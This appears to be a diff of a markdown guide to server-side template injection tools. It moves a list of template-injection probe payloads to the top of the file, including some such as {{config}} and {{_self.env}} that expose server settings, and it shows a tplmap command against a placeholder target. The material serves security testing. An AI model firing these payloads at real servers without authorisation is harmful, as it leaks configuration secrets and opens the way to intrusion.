@@ -1,3 +1,23 @@
+```
+{{7*7}}
+${7*7}
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+~{7*7}
+{{config}}
+{{self}}
+${.vars}
+{{_self.env}}
+{$smarty.version}
+<%= 7*7 %>
+{{7*'7'}}
+{7*7}
+{{7*7}
+${7*7}
+```
+
 # 🔥 SSTI (Server-Side Template Injection) Tools Collection
 
 Complete guide for installing and using SSTI detection and exploitation tools.
@@ -172,25 +192,7 @@ python tplmap.py -u "http://target.com/page?name=John" --proxy http://127.0.0.1:
 🛠️ Manual Testing with Burp Suite
 Burp Intruder Payloads
 Save as ssti-payloads.txt:
-```
-{{7*7}}
-${7*7}
-${{7*7}}
-#{7*7}
-*{7*7}
-@{7*7}
-~{7*7}
-{{config}}
-{{self}}
-${.vars}
-{{_self.env}}
-{$smarty.version}
-<%= 7*7 %>
-{{7*'7'}}
-{7*7}
-{{7*7}
-${7*7}
-```
+
 Burp Intruder Setup
 Send request to Intruder (Ctrl+I)
 
